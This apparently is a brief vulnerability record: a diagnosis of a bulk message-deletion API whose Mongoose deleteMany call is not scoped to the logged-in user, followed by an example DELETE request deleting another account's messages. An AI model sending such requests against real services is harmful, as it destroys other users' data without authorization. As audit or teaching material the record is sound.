diagnosis: A bulk deletion endpoint accepts an array of message IDs from the request body. Mongoose's deleteMany is called using only the IDs, without scoping the query to the authenticated user's account.
exploit_request:
DELETE /api/messages HTTP/1.1
Host: api.example.com
Authorization: Bearer <attacker_token>
Content-Type: application/json

{"ids": ["admin_msg_1", "admin_msg_2"]}
